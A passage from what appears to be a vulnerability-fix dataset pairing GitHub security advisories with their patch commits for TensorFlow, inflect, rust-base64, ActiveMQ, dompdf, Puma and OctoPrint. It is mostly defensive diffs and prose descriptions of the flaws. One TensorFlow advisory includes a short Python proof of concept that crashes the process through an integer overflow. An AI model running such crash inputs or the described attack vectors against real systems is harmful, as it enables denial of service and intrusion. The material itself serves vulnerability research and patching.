issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/cfa91be9863a91d5105a3b4941096044ab32036b","commit_sha":"cfa91be9863a91d5105a3b4941096044ab32036b","patch":"SINGLE","chain_ord":"['cfa91be9863a91d5105a3b4941096044ab32036b']","before_first_fix_commit":"{'00e9a4d67d76703fa1aee33dac582acf317e0e81'}","last_fix_commit":"cfa91be9863a91d5105a3b4941096044ab32036b","chain_ord_pos":1.0,"commit_datetime":"04\/20\/2021, 01:58:47","message":"Fix one FPE and remove two CHECK-fails.\n\nPiperOrigin-RevId: 369349640\nChange-Id: I1fedbfc2b5bab635c5cb51f103d7c9176f79831a","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 11, 'deletions': 2, 'total': 13}","files":"{'tensorflow\/core\/kernels\/quantized_conv_ops.cc': {'additions': 11, 'deletions': 2, 'changes': 13, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/cfa91be9863a91d5105a3b4941096044ab32036b\/tensorflow%2Fcore%2Fkernels%2Fquantized_conv_ops.cc', 'patch': '@@ -18,6 +18,8 @@ limitations under the License.\\n #include <algorithm>\\n #include <vector>\\n \\n+#include \"tensorflow\/core\/platform\/errors.h\"\\n+\\n #define EIGEN_USE_THREADS\\n \\n #define GEMMLOWP_ALLOW_SLOW_SCALAR_FALLBACK\\n@@ -227,8 +229,12 @@ class Im2ColConvFunctor {\\n       return;\\n     }\\n \\n-    CHECK_GT(output_width, 0);\\n-    CHECK_GT(output_height, 0);\\n+    OP_REQUIRES(\\n+        context, output_width > 0,\\n+        errors::InvalidArgument(\"output_width must be strictly positive\"));\\n+    OP_REQUIRES(\\n+        context, output_height > 0,\\n+        errors::InvalidArgument(\"output_height must be strictly positive\"));\\n     int filter_left_offset;\\n     int filter_top_offset;\\n     if (padding == VALID) {\\n@@ -255,6 +261,9 @@ class Im2ColConvFunctor {\\n     \/\/ by the width, then the height. This is the standard memory order in the\\n     \/\/ image world if it helps to visualize it.\\n     const int filter_value_count = filter_width * filter_height * input_depth;\\n+    OP_REQUIRES(context, filter_value_count > 0,\\n+                errors::InvalidArgument(\\n+                    \"filter patch must contain at least one element\"));\\n     const int64 patches_per_chunk =\\n         kMaxChunkSize \/ (filter_value_count * sizeof(T1));\\n     const int64 chunk_value_count ='}}","message_norm":"fix one fpe and remove two check-fails.\n\npiperorigin-revid: 369349640\nchange-id: i1fedbfc2b5bab635c5cb51f103d7c9176f79831a","language":"en","entities":"[('fix', 'ACTION', ''), ('fpe', 'SECWORD', ''), ('remove', 'ACTION', ''), ('369349640', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/quantized_conv_ops.cc'])","num_files":1.0},{"index":3365,"vuln_id":"GHSA-x4qx-4fjv-hmw6","cwe_id":"{'CWE-190'}","score":6.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/6f4d3e8139ec724dbbcb40505891c81dd1052c4a'}","dataset":"osv","summary":"Integer overflow leading to crash in Tensorflow ### Impact \nThe [implementation of `SparseCountSparseOutput`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/5100e359aef5c8021f2e71c7b986420b85ce7b3d\/tensorflow\/core\/kernels\/count_ops.cc#L168-L273) can be made to crash a TensorFlow process by an integer overflow whose result is then used in a memory allocation:\n\n```python\nimport tensorflow as tf\nimport numpy as np\n    \ntf.raw_ops.SparseCountSparseOutput(\n  indices=[[1,1]],\n  values=[2],\n  dense_shape=[2 ** 31, 2 ** 32],\n  weights=[1],\n  binary_output=True,\n  minlength=-1,\n  maxlength=-1,\n  name=None)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [6f4d3e8139ec724dbbcb40505891c81dd1052c4a](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/6f4d3e8139ec724dbbcb40505891c81dd1052c4a).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Faysal Hossain Shezan from University of Virginia.","published_date":"2022-02-09","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/6f4d3e8139ec724dbbcb40505891c81dd1052c4a","commit_sha":"6f4d3e8139ec724dbbcb40505891c81dd1052c4a","patch":"SINGLE","chain_ord":"['6f4d3e8139ec724dbbcb40505891c81dd1052c4a']","before_first_fix_commit":"{'adbbabdb0d3abb3cdeac69e38a96de1d678b24b3'}","last_fix_commit":"6f4d3e8139ec724dbbcb40505891c81dd1052c4a","chain_ord_pos":1.0,"commit_datetime":"12\/08\/2021, 04:04:02","message":"Prevent crash due to integer overflow followed by allocating negative sized array.\n\nPiperOrigin-RevId: 414891322\nChange-Id: I5df390e0dc1d9f115209293708950cdf9306931c","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 9, 'deletions': 0, 'total': 9}","files":"{'tensorflow\/core\/kernels\/count_ops.cc': {'additions': 9, 'deletions': 0, 'changes': 9, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/6f4d3e8139ec724dbbcb40505891c81dd1052c4a\/tensorflow%2Fcore%2Fkernels%2Fcount_ops.cc', 'patch': '@@ -13,6 +13,8 @@ See the License for the specific language governing permissions and\\n limitations under the License.\\n ==============================================================================*\/\\n \\n+#include <limits>\\n+\\n #include \"absl\/container\/flat_hash_map.h\"\\n #include \"tensorflow\/core\/framework\/op_kernel.h\"\\n #include \"tensorflow\/core\/framework\/op_requires.h\"\\n@@ -23,6 +25,9 @@ limitations under the License.\\n \\n namespace tensorflow {\\n \\n+\/\/ Don\\'t allocate too large `BatchedMap<T>` objects\\n+static int kMaxBatches = std::numeric_limits<int>::max();\\n+\\n template <class T>\\n using BatchedMap = std::vector<absl::flat_hash_map<int64_t, T>>;\\n \\n@@ -235,6 +240,10 @@ class SparseCount : public OpKernel {\\n \\n     bool is_1d = shape.NumElements() == 1;\\n     int num_batches = is_1d ? 1 : shape_vector(0);\\n+    OP_REQUIRES(\\n+        context, 0 < num_batches && num_batches < kMaxBatches,\\n+        errors::InvalidArgument(\"Cannot allocate \", num_batches,\\n+                                \" batches, is the dense shape too wide?\"));\\n \\n     const auto values_values = values.flat<T>();\\n     const auto weight_values = weights.flat<W>();'}}","message_norm":"prevent crash due to integer overflow followed by allocating negative sized array.\n\npiperorigin-revid: 414891322\nchange-id: i5df390e0dc1d9f115209293708950cdf9306931c","language":"en","entities":"[('prevent', 'ACTION', ''), ('integer overflow', 'SECWORD', ''), ('414891322', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/count_ops.cc'])","num_files":1.0},{"index":3370,"vuln_id":"GHSA-x55w-vjjp-222r","cwe_id":"{'CWE-1333'}","score":7.5,"chain":"{'https:\/\/github.com\/pksunkara\/inflect\/commit\/a9a0a8e9561c3487854c7cae42565d9652ec858b'}","dataset":"osv","summary":"inflect vulnerable to Inefficient Regular Expression Complexity inflect is customizable inflections for nodejs. inflect is vulnerable to Inefficient Regular Expression Complexity","published_date":"2021-09-29","chain_len":1,"project":"https:\/\/github.com\/pksunkara\/inflect","commit_href":"https:\/\/github.com\/pksunkara\/inflect\/commit\/a9a0a8e9561c3487854c7cae42565d9652ec858b","commit_sha":"a9a0a8e9561c3487854c7cae42565d9652ec858b","patch":"SINGLE","chain_ord":"['a9a0a8e9561c3487854c7cae42565d9652ec858b']","before_first_fix_commit":"{'c025e153df847bbb2873ae75b1a7bd77b0526745'}","last_fix_commit":"a9a0a8e9561c3487854c7cae42565d9652ec858b","chain_ord_pos":1.0,"commit_datetime":"09\/21\/2021, 10:49:42","message":"Fix CVE-2021-3820","author":"Pavan Kumar Sunkara","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'lib\/methods.js': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/pksunkara\/inflect\/raw\/a9a0a8e9561c3487854c7cae42565d9652ec858b\/lib%2Fmethods.js', 'patch': '@@ -61,7 +61,7 @@ inflect.camelize = function (lower_case_and_underscored_word, first_letter_in_up\\n inflect.underscore = function (camel_cased_word) {\\n   var self;\\n   self = util.string.gsub(camel_cased_word, \/\\\\.\/, \\'\/\\');\\n-  self = util.string.gsub(self, \/([A-Z]+)([A-Z][a-z])\/, \\'$1_$2\\');\\n+  self = util.string.gsub(self, \/([A-Z])([A-Z][a-z])\/, \\'$1_$2\\');\\n   self = util.string.gsub(self, \/([a-z\\\\d])([A-Z])\/, \\'$1_$2\\');\\n   self = util.string.gsub(self, \/-\/, \\'_\\');\\n   return self.toLowerCase();\\n@@ -230,5 +230,5 @@ inflect.tableize = function (class_name) {\\n \/\/\\n \/\/     \"business\".classify()       \/\/ => \"Busines\"\\n inflect.classify = function (table_name) {\\n-  return inflect.camelize(inflect.singularize(util.string.gsub(table_name, \/.*\\\\.\/, \\'\\')));\\n+  return inflect.camelize(inflect.singularize(util.string.gsub(table_name, \/^.*\\\\.\/, \\'\\')));\\n };'}}","message_norm":"fix cve-2021-3820","language":"fr","entities":"[('fix', 'ACTION', ''), ('cve-2021-3820', 'VULNID', 'CVE')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/methods.js'])","num_files":1.0},{"index":3382,"vuln_id":"GHSA-x67x-vg9m-65c3","cwe_id":"{'CWE-119'}","score":9.8,"chain":"{'https:\/\/github.com\/alicemaz\/rust-base64\/commit\/24ead980daf11ba563e4fb2516187a56a71ad319'}","dataset":"osv","summary":"Integer overflow in base64 Affected versions of this crate suffered from an integer overflow bug when\ncalculating the size of a buffer to use when encoding base64 using the\n`encode_config_buf` and `encode_config` functions.  If the input string\nwas large, this would cause a buffer to be allocated that was too small.\nSince this function writes to the buffer using unsafe code, it would\nallow an attacker to write beyond the buffer, causing memory corruption\nand possibly the execution of arbitrary code.\n\nThis flaw was corrected by using checked arithmetic to calculate\nthe size of the buffer.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/alicemaz\/rust-base64","commit_href":"https:\/\/github.com\/alicemaz\/rust-base64\/commit\/24ead980daf11ba563e4fb2516187a56a71ad319","commit_sha":"24ead980daf11ba563e4fb2516187a56a71ad319","patch":"SINGLE","chain_ord":"['24ead980daf11ba563e4fb2516187a56a71ad319']","before_first_fix_commit":"{'21a9389cf340f1e36e48856859d5713b97744383'}","last_fix_commit":"24ead980daf11ba563e4fb2516187a56a71ad319","chain_ord_pos":1.0,"commit_datetime":"05\/03\/2017, 05:26:40","message":"Use checked arithmetic in encoded_size\n\npreviously encoded_size could silently overflow usize, resulting in\nwrite past the bounds of the buffer allocated by reserve. this changes\nencoded_size to return an option, with none if overflow occurs.\npresently callers simply panic on this case, but it could conceivably be\nrendered as an error in the future\n\ncredit to Andrew Ayer for reporting this vulnerability","author":"Alice Maz","comments":null,"stats":"{'additions': 75, 'deletions': 61, 'total': 136}","files":"{'src\/lib.rs': {'additions': 75, 'deletions': 61, 'changes': 136, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/marshallpierce\/rust-base64\/raw\/24ead980daf11ba563e4fb2516187a56a71ad319\/src%2Flib.rs', 'patch': '@@ -171,31 +171,36 @@ pub fn decode<T: ?Sized + AsRef<[u8]>>(input: &T) -> Result<Vec<u8>, DecodeError\\n \/\/\/}\\n \/\/\/```\\n pub fn encode_config<T: ?Sized + AsRef<[u8]>>(input: &T, config: Config) -> String {\\n-    let mut buf = String::with_capacity(encoded_size(input.as_ref().len(), config));\\n+    let mut buf = match encoded_size(input.as_ref().len(), config) {\\n+        Some(n) => String::with_capacity(n),\\n+        None => panic!(\"integer overflow when calculating buffer size\")\\n+    };\\n \\n     encode_config_buf(input, config, &mut buf);\\n \\n     buf\\n }\\n \\n \/\/\/ calculate the base64 encoded string size, including padding\\n-fn encoded_size(bytes_len: usize, config: Config) -> usize {\\n-    let rem = bytes_len % 3;\\n-\\n-    let complete_input_chunks = bytes_len \/ 3;\\n-    let complete_output_chars = complete_input_chunks * 4;\\n-    let printing_output_chars = if rem == 0 {\\n-        complete_output_chars\\n-    } else {\\n-        complete_output_chars + 4\\n-    };\\n+fn encoded_size(bytes_len: usize, config: Config) -> Option<usize> {\\n+    let printing_output_chars = bytes_len\\n+        .checked_add(2)\\n+        .map(|x| x \/ 3)\\n+        .and_then(|x| x.checked_mul(4));\\n+\\n+    \/\/TODO this is subtly wrong but in a not dangerous way\\n+    \/\/pushing patch with identical to previous behavior, then fixing\\n     let line_ending_output_chars = match config.line_wrap {\\n-        LineWrap::NoWrap => 0,\\n-        LineWrap::Wrap(n, LineEnding::CRLF) => printing_output_chars \/ n * 2,\\n-        LineWrap::Wrap(n, LineEnding::LF) => printing_output_chars \/ n,\\n+        LineWrap::NoWrap => Some(0),\\n+        LineWrap::Wrap(n, LineEnding::CRLF) =>\\n+            printing_output_chars.map(|y| y \/ n).and_then(|y| y.checked_mul(2)),\\n+        LineWrap::Wrap(n, LineEnding::LF) =>\\n+            printing_output_chars.map(|y| y \/ n),\\n     };\\n \\n-    return printing_output_chars + line_ending_output_chars;\\n+    printing_output_chars.and_then(|x|\\n+        line_ending_output_chars.and_then(|y| x.checked_add(y))\\n+    )\\n }\\n \\n \/\/\/Encode arbitrary octets as base64.\\n@@ -224,7 +229,11 @@ pub fn encode_config_buf<T: ?Sized + AsRef<[u8]>>(input: &T, config: Config, buf\\n     };\\n \\n     \/\/ reserve to make sure the memory we\\'ll be writing to with unsafe is allocated\\n-    buf.reserve(encoded_size(input_bytes.len(), config));\\n+    let resv_size = match encoded_size(input_bytes.len(), config) {\\n+        Some(n) => n,\\n+        None => panic!(\"integer overflow when calculating buffer size\"),\\n+    };\\n+    buf.reserve(resv_size);\\n \\n     let orig_buf_len = buf.len();\\n     let mut fast_loop_output_buf_len = orig_buf_len;\\n@@ -579,52 +588,52 @@ mod tests {\\n \\n     #[test]\\n     fn encoded_size_correct() {\\n-        assert_eq!(0, encoded_size(0, STANDARD));\\n+        assert_eq!(Some(0), encoded_size(0, STANDARD));\\n \\n-        assert_eq!(4, encoded_size(1, STANDARD));\\n-        assert_eq!(4, encoded_size(2, STANDARD));\\n-        assert_eq!(4, encoded_size(3, STANDARD));\\n+        assert_eq!(Some(4), encoded_size(1, STANDARD));\\n+        assert_eq!(Some(4), encoded_size(2, STANDARD));\\n+        assert_eq!(Some(4), encoded_size(3, STANDARD));\\n \\n-        assert_eq!(8, encoded_size(4, STANDARD));\\n-        assert_eq!(8, encoded_size(5, STANDARD));\\n-        assert_eq!(8, encoded_size(6, STANDARD));\\n+        assert_eq!(Some(8), encoded_size(4, STANDARD));\\n+        assert_eq!(Some(8), encoded_size(5, STANDARD));\\n+        assert_eq!(Some(8), encoded_size(6, STANDARD));\\n \\n-        assert_eq!(12, encoded_size(7, STANDARD));\\n-        assert_eq!(12, encoded_size(8, STANDARD));\\n-        assert_eq!(12, encoded_size(9, STANDARD));\\n+        assert_eq!(Some(12), encoded_size(7, STANDARD));\\n+        assert_eq!(Some(12), encoded_size(8, STANDARD));\\n+        assert_eq!(Some(12), encoded_size(9, STANDARD));\\n \\n-        assert_eq!(72, encoded_size(54, STANDARD));\\n+        assert_eq!(Some(72), encoded_size(54, STANDARD));\\n \\n-        assert_eq!(76, encoded_size(55, STANDARD));\\n-        assert_eq!(76, encoded_size(56, STANDARD));\\n-        assert_eq!(76, encoded_size(57, STANDARD));\\n+        assert_eq!(Some(76), encoded_size(55, STANDARD));\\n+        assert_eq!(Some(76), encoded_size(56, STANDARD));\\n+        assert_eq!(Some(76), encoded_size(57, STANDARD));\\n \\n-        assert_eq!(80, encoded_size(58, STANDARD));\\n+        assert_eq!(Some(80), encoded_size(58, STANDARD));\\n     }\\n \\n     #[test]\\n     fn encoded_size_correct_mime() {\\n-        assert_eq!(0, encoded_size(0, MIME));\\n+        assert_eq!(Some(0), encoded_size(0, MIME));\\n \\n-        assert_eq!(4, encoded_size(1, MIME));\\n-        assert_eq!(4, encoded_size(2, MIME));\\n-        assert_eq!(4, encoded_size(3, MIME));\\n+        assert_eq!(Some(4), encoded_size(1, MIME));\\n+        assert_eq!(Some(4), encoded_size(2, MIME));\\n+        assert_eq!(Some(4), encoded_size(3, MIME));\\n \\n-        assert_eq!(8, encoded_size(4, MIME));\\n-        assert_eq!(8, encoded_size(5, MIME));\\n-        assert_eq!(8, encoded_size(6, MIME));\\n+        assert_eq!(Some(8), encoded_size(4, MIME));\\n+        assert_eq!(Some(8), encoded_size(5, MIME));\\n+        assert_eq!(Some(8), encoded_size(6, MIME));\\n \\n-        assert_eq!(12, encoded_size(7, MIME));\\n-        assert_eq!(12, encoded_size(8, MIME));\\n-        assert_eq!(12, encoded_size(9, MIME));\\n+        assert_eq!(Some(12), encoded_size(7, MIME));\\n+        assert_eq!(Some(12), encoded_size(8, MIME));\\n+        assert_eq!(Some(12), encoded_size(9, MIME));\\n \\n-        assert_eq!(72, encoded_size(54, MIME));\\n+        assert_eq!(Some(72), encoded_size(54, MIME));\\n \\n-        assert_eq!(78, encoded_size(55, MIME));\\n-        assert_eq!(78, encoded_size(56, MIME));\\n-        assert_eq!(78, encoded_size(57, MIME));\\n+        assert_eq!(Some(78), encoded_size(55, MIME));\\n+        assert_eq!(Some(78), encoded_size(56, MIME));\\n+        assert_eq!(Some(78), encoded_size(57, MIME));\\n \\n-        assert_eq!(82, encoded_size(58, MIME));\\n+        assert_eq!(Some(82), encoded_size(58, MIME));\\n     }\\n \\n     #[test]\\n@@ -636,26 +645,31 @@ mod tests {\\n             LineWrap::Wrap(76, LineEnding::LF)\\n         );\\n \\n-        assert_eq!(0, encoded_size(0, config));\\n+        assert_eq!(Some(0), encoded_size(0, config));\\n+\\n+        assert_eq!(Some(4), encoded_size(1, config));\\n+        assert_eq!(Some(4), encoded_size(2, config));\\n+        assert_eq!(Some(4), encoded_size(3, config));\\n \\n-        assert_eq!(4, encoded_size(1, config));\\n-        assert_eq!(4, encoded_size(2, config));\\n-        assert_eq!(4, encoded_size(3, config));\\n+        assert_eq!(Some(8), encoded_size(4, config));\\n+        assert_eq!(Some(8), encoded_size(5, config));\\n+        assert_eq!(Some(8), encoded_size(6, config));\\n \\n-        assert_eq!(8, encoded_size(4, config));\\n-        assert_eq!(8, encoded_size(5, config));\\n-        assert_eq!(8, encoded_size(6, config));\\n+        assert_eq!(Some(12), encoded_size(7, config));\\n+        assert_eq!(Some(12), encoded_size(8, config));\\n+        assert_eq!(Some(12), encoded_size(9, config));\\n \\n-        assert_eq!(12, encoded_size(7, config));\\n-        assert_eq!(12, encoded_size(8, config));\\n-        assert_eq!(12, encoded_size(9, config));\\n+        assert_eq!(Some(72), encoded_size(54, config));\\n \\n-        assert_eq!(72, encoded_size(54, config));\\n+        assert_eq!(Some(77), encoded_size(55, config));\\n+        assert_eq!(Some(77), encoded_size(56, config));\\n+        assert_eq!(Some(77), encoded_size(57, config));\\n \\n-        assert_eq!(77, encoded_size(55, config));\\n-        assert_eq!(77, encoded_size(56, config));\\n-        assert_eq!(77, encoded_size(57, config));\\n+        assert_eq!(Some(81), encoded_size(58, config));\\n+    }\\n \\n-        assert_eq!(81, encoded_size(58, config));\\n+    #[test]\\n+    fn encoded_size_overflow() {\\n+        assert_eq!(None, encoded_size(std::usize::MAX, STANDARD));\\n     }\\n }'}}","message_norm":"use checked arithmetic in encoded_size\n\npreviously encoded_size could silently overflow usize, resulting in\nwrite past the bounds of the buffer allocated by reserve. this changes\nencoded_size to return an option, with none if overflow occurs.\npresently callers simply panic on this case, but it could conceivably be\nrendered as an error in the future\n\ncredit to andrew ayer for reporting this vulnerability","language":"en","entities":"[('encoded_size', 'SECWORD', ''), ('encoded_size', 'SECWORD', ''), ('overflow', 'SECWORD', ''), ('encoded_size', 'SECWORD', ''), ('overflow', 'SECWORD', ''), ('error', 'FLAW', ''), ('vulnerability', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/lib.rs'])","num_files":1.0},{"index":3386,"vuln_id":"GHSA-x6rc-54xp-ccxx","cwe_id":"{'CWE-611'}","score":9.8,"chain":"{'https:\/\/github.com\/apache\/activemq-artemis\/commit\/48d9951d879e0c8cbb59d4b64ab59d53ef88310d'}","dataset":"osv","summary":"Improper Restriction of XML External Entity Reference in Apache ActiveMQ XML external entity (XXE) vulnerability in the XPath selector component in Artemis ActiveMQ before commit 48d9951d879e0c8cbb59d4b64ab59d53ef88310d allows remote attackers to have unspecified impact via unknown vectors.","published_date":"2022-05-14","chain_len":1,"project":"https:\/\/github.com\/apache\/activemq-artemis","commit_href":"https:\/\/github.com\/apache\/activemq-artemis\/commit\/48d9951d879e0c8cbb59d4b64ab59d53ef88310d","commit_sha":"48d9951d879e0c8cbb59d4b64ab59d53ef88310d","patch":"SINGLE","chain_ord":"['48d9951d879e0c8cbb59d4b64ab59d53ef88310d']","before_first_fix_commit":"{'879f4a6bb3b15dfc3d00bcde2d982194bd2dadc4'}","last_fix_commit":"48d9951d879e0c8cbb59d4b64ab59d53ef88310d","chain_ord_pos":1.0,"commit_datetime":"05\/21\/2015, 09:49:45","message":"ActiveMQ6-112 Add defaults to the selector parser doc builder","author":"Martyn Taylor","comments":null,"stats":"{'additions': 14, 'deletions': 4, 'total': 18}","files":"{'artemis-selector\/src\/main\/java\/org\/apache\/activemq\/artemis\/selector\/filter\/XalanXPathEvaluator.java': {'additions': 14, 'deletions': 4, 'changes': 18, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/apache\/activemq-artemis\/raw\/48d9951d879e0c8cbb59d4b64ab59d53ef88310d\/artemis-selector%2Fsrc%2Fmain%2Fjava%2Forg%2Fapache%2Factivemq%2Fartemis%2Fselector%2Ffilter%2FXalanXPathEvaluator.java', 'patch': '@@ -18,6 +18,7 @@\\n \\n import javax.xml.parsers.DocumentBuilder;\\n import javax.xml.parsers.DocumentBuilderFactory;\\n+import javax.xml.parsers.ParserConfigurationException;\\n import java.io.StringReader;\\n \\n import org.apache.xpath.CachedXPathAPI;\\n@@ -56,9 +57,7 @@ protected boolean evaluate(InputSource inputSource)\\n    {\\n       try\\n       {\\n-         DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\\n-         factory.setNamespaceAware(true);\\n-         DocumentBuilder dbuilder = factory.newDocumentBuilder();\\n+         DocumentBuilder dbuilder = createDocumentBuilder();\\n          Document doc = dbuilder.parse(inputSource);\\n \\n          \/\/An XPath expression could return a true or false value instead of a node.\\n@@ -75,11 +74,22 @@ protected boolean evaluate(InputSource inputSource)\\n             NodeIterator iterator = cachedXPathAPI.selectNodeIterator(doc, xpath);\\n             return (iterator.nextNode() != null);\\n          }\\n-\\n       }\\n       catch (Throwable e)\\n       {\\n          return false;\\n       }\\n    }\\n+\\n+   private DocumentBuilder createDocumentBuilder() throws ParserConfigurationException\\n+   {\\n+      DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\\n+      factory.setNamespaceAware(true);\\n+\\n+      factory.setFeature(\"http:\/\/xml.org\/sax\/features\/external-general-entities\", false);\\n+      factory.setFeature(\"http:\/\/xml.org\/sax\/features\/external-parameter-entities\", false);\\n+      factory.setFeature(\"http:\/\/apache.org\/xml\/features\/disallow-doctype-decl\", true);\\n+\\n+      return factory.newDocumentBuilder();\\n+   }\\n }'}}","message_norm":"activemq6-112 add defaults to the selector parser doc builder","language":"en","entities":"[('add', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['artemis-selector\/src\/main\/java\/org\/apache\/activemq\/artemis\/selector\/filter\/XalanXPathEvaluator.java'])","num_files":1.0},{"index":3387,"vuln_id":"GHSA-x752-qjv4-c4hc","cwe_id":"{'CWE-74'}","score":9.8,"chain":"{'https:\/\/github.com\/dompdf\/dompdf\/commit\/4c70e1025bcd9b7694b95dd552499bd83cd6141d'}","dataset":"osv","summary":"Remote code injection in dompdf\/dompdf Dompdf is an HTML to PDF converter. Dompdf before 1.2.1 allows remote code execution via a .php file in the src:url field of an @font-face Cascading Style Sheets (CSS) statement (within an HTML input file).","published_date":"2022-04-04","chain_len":1,"project":"https:\/\/github.com\/dompdf\/dompdf","commit_href":"https:\/\/github.com\/dompdf\/dompdf\/commit\/4c70e1025bcd9b7694b95dd552499bd83cd6141d","commit_sha":"4c70e1025bcd9b7694b95dd552499bd83cd6141d","patch":"SINGLE","chain_ord":"['4c70e1025bcd9b7694b95dd552499bd83cd6141d']","before_first_fix_commit":"{'0347b9a73f8a03b1b7e659312416f6fd6c7a0cee'}","last_fix_commit":"4c70e1025bcd9b7694b95dd552499bd83cd6141d","chain_ord_pos":1.0,"commit_datetime":"03\/17\/2022, 00:09:04","message":"Match installed font filename extension to type\n\nfixes #2598","author":"Brian Sweeney","comments":"{'com_1': {'author': 'Jakess39', 'datetime': '04\/16\/2022, 09:55:58', 'body': '> #2526'}, 'com_2': {'author': 'Jakess39', 'datetime': '04\/16\/2022, 09:56:11', 'body': '> > #2526'}}","stats":"{'additions': 7, 'deletions': 1, 'total': 8}","files":"{'src\/FontMetrics.php': {'additions': 7, 'deletions': 1, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/dompdf\/dompdf\/raw\/4c70e1025bcd9b7694b95dd552499bd83cd6141d\/src%2FFontMetrics.php', 'patch': '@@ -206,7 +206,6 @@ public function registerFont($style, $remoteFile, $context = null)\\n         }\\n \\n         $cacheEntry = $localFile;\\n-        $localFile .= \".\".strtolower(pathinfo(parse_url($remoteFile, PHP_URL_PATH), PATHINFO_EXTENSION));\\n \\n         $entry[$styleString] = $cacheEntry;\\n \\n@@ -258,6 +257,13 @@ public function registerFont($style, $remoteFile, $context = null)\\n             return false;\\n         }\\n \\n+        switch ($font->getFontType()) {\\n+            case \"TrueType\":\\n+            default:\\n+                $localFile .= \".ttf\";\\n+                break;\\n+        }\\n+\\n         $font->parse();\\n         $font->saveAdobeFontMetrics(\"$cacheEntry.ufm\");\\n         $font->close();'}}","message_norm":"match installed font filename extension to type\n\nfixes #2598","language":"en","entities":"[('#2598', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/FontMetrics.php'])","num_files":1.0},{"index":3392,"vuln_id":"GHSA-x7jg-6pwg-fx5h","cwe_id":"{'CWE-444'}","score":7.5,"chain":"{'https:\/\/github.com\/puma\/puma\/commit\/f24d5521295a2152c286abb0a45a1e1e2bd275bd'}","dataset":"osv","summary":"HTTP Smuggling via Transfer-Encoding Header in Puma ### Impact\n\nBy using an invalid transfer-encoding header, an attacker could [smuggle an HTTP response.](https:\/\/portswigger.net\/web-security\/request-smuggling)\n\nOriginally reported by @ZeddYu, who has our thanks for the detailed report.\n\n### Patches\n\nThe problem has been fixed in Puma 3.12.5 and Puma 4.3.4.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue in [Puma](https:\/\/github.com\/puma\/puma)\n* See our [security policy](https:\/\/github.com\/puma\/puma\/security\/policy)","published_date":"2020-05-22","chain_len":1,"project":"https:\/\/github.com\/puma\/puma","commit_href":"https:\/\/github.com\/puma\/puma\/commit\/f24d5521295a2152c286abb0a45a1e1e2bd275bd","commit_sha":"f24d5521295a2152c286abb0a45a1e1e2bd275bd","patch":"SINGLE","chain_ord":"['f24d5521295a2152c286abb0a45a1e1e2bd275bd']","before_first_fix_commit":"{'7a6593760d667dff95953e15c2327892e2da673c'}","last_fix_commit":"f24d5521295a2152c286abb0a45a1e1e2bd275bd","chain_ord_pos":1.0,"commit_datetime":"05\/18\/2020, 23:01:53","message":"Better handle client input","author":"Evan Phoenix","comments":null,"stats":"{'additions': 10, 'deletions': 2, 'total': 12}","files":"{'lib\/puma\/client.rb': {'additions': 10, 'deletions': 2, 'changes': 12, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/puma\/puma\/raw\/f24d5521295a2152c286abb0a45a1e1e2bd275bd\/lib%2Fpuma%2Fclient.rb', 'patch': '@@ -285,8 +285,16 @@ def setup_body\\n \\n       te = @env[TRANSFER_ENCODING2]\\n \\n-      if te && CHUNKED.casecmp(te) == 0\\n-        return setup_chunked_body(body)\\n+      if te\\n+        if te.include?(\",\")\\n+          te.split(\",\").each do |part|\\n+            if CHUNKED.casecmp(part.strip) == 0\\n+              return setup_chunked_body(body)\\n+            end\\n+          end\\n+        elsif CHUNKED.casecmp(te) == 0\\n+          return setup_chunked_body(body)\\n+        end\\n       end\\n \\n       @chunked_body = false'}}","message_norm":"better handle client input","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/puma\/client.rb'])","num_files":1.0},{"index":3394,"vuln_id":"GHSA-x7r7-wmj8-vv5g","cwe_id":"{'CWE-79'}","score":7.5,"chain":"{'https:\/\/github.com\/octoprint\/octoprint\/commit\/8087528e4a7ddd15c7d95ff662deb5ef7de90045'}","dataset":"osv","summary":"Cross-site Scripting in OctoPrint Cross-site Scripting (XSS) - DOM in GitHub repository octoprint\/octoprint prior to 1.8.0. The login endpoint allows for javascript injection which may lead to account takeover in a phishing 